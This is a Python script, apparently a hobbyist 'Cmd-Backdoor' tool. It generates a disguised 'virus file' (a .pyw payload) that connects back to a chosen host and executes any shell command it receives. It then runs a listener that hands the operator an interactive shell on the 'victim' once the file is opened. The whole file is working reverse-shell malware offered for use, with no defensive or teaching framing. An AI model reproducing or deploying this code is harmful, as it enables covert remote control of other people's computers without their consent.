from socket import *
import os
import time

print("""\033[31m
   _____               _            ____             _       _
  / ____|             | |          |  _ \           | |     | |
 | |     _ __ ___   __| |  ______  | |_) | __ _  ___| | ____| | ___   ___  _ __
 | |    | '_ ` _ \ / _` | |______| |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 | |____| | | | | | (_| |          | |_) | (_| | (__|   < (_| | (_) | (_) | |
  \_____|_| |_| |_|\__,_|          |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|
""")
HOST = input("\033[91m[\033[37m~\033[91m]\033[37m On What Ip Should Cmd-Backdoor Start? (Example : localhost) : ")
PORT = input("\033[91m[\033[37m~\033[91m]\033[37m On What Port Should Cmd-Backdoor Start? (Example : 443) : ")
NAME = input("\033[91m[\033[37m~\033[91m]\033[37m What Is The Name Of The Virus File? (Example : test.pyw) : ")

w = open(NAME, 'w')
w.write('''
import socket
import subprocess
import os

HOST = '{}'
PORT = {}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
while 1:
    data = s.recv(4096)
    if data == 'quit':
        break
    output = subprocess.getoutput(data.decode('utf-8'))
    s.send(output.encode('utf-8'))
s.close()
'''.format(HOST,PORT))
w.close()
print("")
print("Made %s! When someone opens this file, you will be able to access their terminal!" % NAME)
time.sleep(3)
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, int(PORT)))
print("")
print("\033[91m[\033[37m~\033[91m]\033[37m Listening On {}:{}".format(HOST,str(PORT)))

s.listen(1)

conn, addr = s.accept()
print("\033[91m[\033[37m~\033[91m]\033[37m Victim Connected ==> %s:%s"% (str(addr[0]), str(addr[1]) ))

while 1:
    command = input("\033[91m[\033[37m~\033[91m]\033[37m >> ")
    conn.send(command.encode('utf-8'))
    data = conn.recv(4096)
    print("\033[37m")
    print(data.decode())
    print("")
conn.close()
